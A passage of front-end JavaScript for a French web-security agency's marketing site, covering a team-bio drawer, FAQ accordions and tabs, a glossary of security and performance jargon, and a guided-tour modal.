        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Certifications & Titres</h4>
        <ul style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 0.5rem;">
          ${data.certs.map(c => `
            <li style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.85rem; color: var(--clr-text-2);">
              <span style="color: ${data.color}; flex-shrink: 0;">✓</span>
              <span>${c}</span>
            </li>
          `).join('')}
        </ul>
      </div>
    `;

    drawer.style.display = 'flex';
    setTimeout(() => {
      drawer.classList.add('active');
      drawer.setAttribute('aria-hidden', 'false');
      overlay.style.opacity = '1';
      pane.style.transform = 'translateX(0)';
    }, 10);
  }

  function closeDrawer() {
    overlay.style.opacity = '0';
    pane.style.transform = 'translateX(100%)';
    drawer.classList.remove('active');
    drawer.setAttribute('aria-hidden', 'true');
    setTimeout(() => {
      if (!drawer.classList.contains('active')) {
        drawer.style.display = 'none';
      }
    }, 400);
  }

  triggers.forEach(trigger => {
    trigger.addEventListener('click', () => {
      const bioKey = trigger.dataset.bio;
      openDrawer(bioKey);
    });
  });

  closeBtn.addEventListener('click', closeDrawer);
  overlay.addEventListener('click', closeDrawer);
  
  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && drawer.classList.contains('active')) {
      closeDrawer();
    }
  });
}

// ═══════════════════════════════════════════════
// 18. FAQ ACCORDION TRANSITIONS
// ═══════════════════════════════════════════════
function initFaqAccordions() {
  const triggers = document.querySelectorAll('.faq-trigger');
  triggers.forEach(trigger => {
    trigger.addEventListener('click', () => {
      const item = trigger.closest('.faq-item');
      const expanded = trigger.getAttribute('aria-expanded') === 'true';
      const content = item.querySelector('.faq-content');
      const chevron = trigger.querySelector('.faq-chevron');

      // Close all others in the SAME pane only
      const pane = item.closest('.faq-group-pane') || item.closest('.faq-list');
      const scope = pane ? pane.querySelectorAll('.faq-item') : document.querySelectorAll('.faq-item');
      scope.forEach(otherItem => {
        if (otherItem !== item) {
          otherItem.classList.remove('active');
          const otherTrigger = otherItem.querySelector('.faq-trigger');
          const otherContent = otherItem.querySelector('.faq-content');
          const otherChevron = otherItem.querySelector('.faq-chevron');
          if (otherTrigger) otherTrigger.setAttribute('aria-expanded', 'false');
          if (otherContent) otherContent.style.gridTemplateRows = '0fr';
          if (otherChevron) otherChevron.style.transform = 'rotate(0deg)';
        }
      });

      // Toggle current
      if (expanded) {
        item.classList.remove('active');
        trigger.setAttribute('aria-expanded', 'false');
        if (content) content.style.gridTemplateRows = '0fr';
        if (chevron) chevron.style.transform = 'rotate(0deg)';
      } else {
        item.classList.add('active');
        trigger.setAttribute('aria-expanded', 'true');
        if (content) content.style.gridTemplateRows = '1fr';
        if (chevron) chevron.style.transform = 'rotate(180deg)';
      }
    });
  });
}

// ═══════════════════════════════════════════════
// 19. FAQ CATEGORY TABS
// ═══════════════════════════════════════════════
function initFaqTabs() {
  const tabBtns = document.querySelectorAll('.faq-tab-btn');
  const tabPanes = document.querySelectorAll('.faq-group-pane');
  if (!tabBtns.length || !tabPanes.length) return;

  tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const targetTab = btn.dataset.tab;

      // Update buttons
      tabBtns.forEach(b => {
        b.classList.remove('active');
        b.setAttribute('aria-selected', 'false');
      });
      btn.classList.add('active');
      btn.setAttribute('aria-selected', 'true');

      // Update panes
      tabPanes.forEach(pane => {
        if (pane.id === `pane-${targetTab}`) {
          pane.classList.add('active');
          pane.removeAttribute('hidden');
          pane.style.display = '';
        } else {
          pane.classList.remove('active');
          pane.setAttribute('hidden', '');
          pane.style.display = 'none';
        }
      });
    });
  });

  // Initialize: show first pane, hide others
  tabPanes.forEach((pane, idx) => {
    if (idx === 0) {
      pane.classList.add('active');
      pane.style.display = '';
    } else {
      pane.classList.remove('active');
      pane.style.display = 'none';
    }
  });
}

// ═══════════════════════════════════════════════
// 20. JARGON DECODER (Cyber Buster)
// ═══════════════════════════════════════════════
function initJargonDecoder() {
  const items = document.querySelectorAll('.jargon-item');
  const titleEl = document.getElementById('jargon-bubble-title');
  const descEl = document.getElementById('jargon-bubble-desc');
  if (!items.length || !titleEl || !descEl) return;

  const jargonData = {
    lcp: {
      title: 'LCP — Largest Contentful Paint (Vitesse)',
      desc: 'Le chrono de chargement principal. C\'est le temps nécessaire pour que l\'élément le plus lourd de votre page web apparaisse à l\'écran. Notre architecture Edge garantit un score LCP parfait de 100/100, assurant une expérience client fluide et un SEO optimisé.'
    },
    waf: {
      title: 'WAF — Web Application Firewall (Frontal)',
      desc: 'Le videur ultra-intelligent de votre site. Un WAF analyse chaque requête avant qu\'elle n\'atteigne votre serveur. Il bloque en temps réel les hackers, robots malveillants, injections SQL et attaques DDoS. Arkis utilise le WAF Enterprise de Cloudflare, le plus avancé du marché.'
    },
    rls: {
      title: 'RLS — Row-Level Security (Isolation)',
      desc: 'La serrure individuelle de chaque donnée. Dans votre base de données Supabase, le RLS garantit que chaque utilisateur ne peut voir et modifier que ses propres données. Même si un hacker accède à la base, il ne voit qu\'une cellule vide : la sienne.'
    },
    cve: {
      title: 'CVE — Common Vulnerabilities & Exposures (Faille)',
      desc: 'Le catalogue mondial des failles informatiques connues. Chaque faille découverte reçoit un identifiant unique (ex: CVE-2024-1234). Arkis surveille ce catalogue en temps réel pour patcher vos infrastructures avant qu\'un hacker ne puisse les exploiter.'
    },
    pentest: {
      title: 'Pen-testing — Test d\'Intrusion',
      desc: 'L\'attaque simulée que nous lançons contre votre propre site. Nos experts OSCP jouent le rôle du hacker et tentent de s\'introduire dans votre infrastructure avec toutes les techniques réelles. L\'objectif : trouver les failles avant les vrais attaquants et les colmater immédiatement.'
    },
    jamstack: {
      title: 'JAMstack — JavaScript, APIs, Markup',
      desc: 'L\'architecture qui rend votre site aussi rapide que Google. JAMstack signifie que votre site est pré-généré en milliers de fichiers statiques ultra-légers, distribués dans le monde entier via un CDN. Résultat : score 100/100 Google, zéro serveur exposé aux hackers.'
    },
    buildrun: {
      title: 'Build & Run — Notre modèle tarifaire',
      desc: 'La séparation claire entre la construction et la protection. La phase BUILD est le coût unique de création de votre site (conception, développement, déploiement). La phase RUN est l\'abonnement mensuel de surveillance, maintenance et sécurité active. Comme construire une maison, puis payer la surveillance 24h/24.'
    },
    zerotrust: {
      title: 'Zero-Trust — Confiance Zéro',
      desc: 'Le principe : ne faire confiance à personne, jamais, même à l\'intérieur de votre réseau. Chaque accès, chaque requête, chaque utilisateur est vérifié à chaque fois. Contrairement à la sécurité traditionnelle (périmètre de château fort), Zero-Trust traite chaque demande comme potentiellement malveillante.'
    }
  };

  function showJargon(key) {
    const data = jargonData[key];
    if (!data) return;
    items.forEach(i => i.classList.toggle('active', i.dataset.jargon === key));
    titleEl.textContent = data.title;
    descEl.textContent = data.desc;
  }

  items.forEach(item => {
    item.addEventListener('click', () => showJargon(item.dataset.jargon));
    item.addEventListener('mouseenter', () => showJargon(item.dataset.jargon));
    item.style.cursor = 'pointer';
  });
}

// ═══════════════════════════════════════════════
// 21. GUIDED TOUR (Visite Guidée)
// ═══════════════════════════════════════════════
function initGuidedTour() {
  const triggerBtn = document.getElementById('tour-trigger-btn');
  const modal = document.getElementById('tour-modal');
  const closeBtn = document.getElementById('tour-close-btn');
  const nextBtn = document.getElementById('tour-btn-next');
  const prevBtn = document.getElementById('tour-btn-prev');
  const stepBadge = document.getElementById('tour-step-badge');
  const titleEl = document.getElementById('tour-title');
  const textEl = document.getElementById('tour-text');
  const dots = document.querySelectorAll('.tour-dot');

  if (!triggerBtn || !modal || !closeBtn || !nextBtn || !prevBtn) return;

  const steps = [
    {
      title: 'Bienvenue chez Arkis 👋',
      text: 'Nous créons des applications web sur-mesure d\'une vitesse foudroyante et dotées d\'une sécurité offensive intégrée dès la conception. Découvrons ensemble comment nous blindons votre avenir numérique !'
    },
    {
      title: '⚡ Des sites 100/100 Google',
      text: 'Notre architecture JAMstack Edge délivre vos pages depuis le serveur le plus proche de vos visiteurs dans le monde. Résultat garanti : score LCP parfait de 100/100 sur Google PageSpeed, ce qui propulse votre référencement en première page.'
    },
    {
      title: '🛡️ Sécurité Offensive Intégrée',
      text: 'Arkis ne rajoute pas la sécurité après coup. Nous concevons chaque architecture comme une forteresse : WAF Enterprise Cloudflare, isolation des données par Row-Level Security Supabase, TLS 1.3, et audits de pénétration réguliers par notre expert OSCP certifié.'
    },
    {
      title: '💰 Le Modèle Build & Run',
      text: 'Phase BUILD : un coût unique pour créer votre site parfait. Phase RUN : un abonnement mensuel pour surveiller, protéger et maintenir votre infrastructure 24h/24. Vous ne payez que ce dont vous avez besoin, avec un SLA garanti contractuellement.'
    },
    {
      title: '🚀 Prêt à commencer ?',
      text: 'Nos experts sont disponibles pour un audit gratuit de votre projet. Nous analysons vos besoins, proposons une architecture sur-mesure et vous donnons une estimation transparente. Zéro engagement, 100% de valeur ajoutée.'
    }
  ];

  let currentStep = 0;

  function renderStep(idx) {
    const step = steps[idx];
    if (stepBadge) stepBadge.textContent = `Étape ${idx + 1}/${steps.length}`;
    if (titleEl) titleEl.textContent = step.title;
    if (textEl) textEl.textContent = step.text;
    if (prevBtn) prevBtn.disabled = idx === 0;
    if (nextBtn) nextBtn.textContent = idx === steps.length - 1 ? 'Commencer 🚀' : 'Suivant ➔';
    dots.forEach((dot, i) => dot.classList.toggle('active', i === idx));
  }

  function openTour() {
    currentStep = 0;
    renderStep(0);
    modal.style.display = 'flex';
    modal.setAttribute('aria-hidden', 'false');
    setTimeout(() => modal.classList.add('active'), 10);
    document.body.style.overflow = 'hidden';
  }

  function closeTour() {
    modal.classList.remove('active');
    modal.setAttribute('aria-hidden', 'true');
    setTimeout(() => { modal.style.display = 'none'; }, 350);
    document.body.style.overflow = '';
  }

  triggerBtn.addEventListener('click', openTour);
  closeBtn.addEventListener('click', closeTour);

  modal.addEventListener('click', (e) => {
    if (e.target === modal) closeTour();
  });

  nextBtn.addEventListener('click', () => {
    if (currentStep >= steps.length - 1) {
      closeTour();
      window.location.href = '/contact';
    } else {
      currentStep++;
      renderStep(currentStep);
    }
  });

  prevBtn.addEventListener('click', () => {
    if (currentStep > 0) {
      currentStep--;
      renderStep(currentStep);
    }
  });

  window.addEventListener('keydown', (e) => {
    if (!modal.classList.contains('active')) return;
    if (e.key === 'Escape') closeTour();
    if (e.key === 'ArrowRight') nextBtn.click();
    if (e.key === 'ArrowLeft') prevBtn.click();
  });
}

// ═══════════════════════════════════════════════
// INITIALIZATION
// ═══════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  initPricingCalculator();
  handleContactPreFill();
  initTeamModals();
  initFaqAccordions();
  initFaqTabs();
  initJargonDecoder();
  initGuidedTour();
  initHardeningSimulator();
  initCyberThreatMap();
});

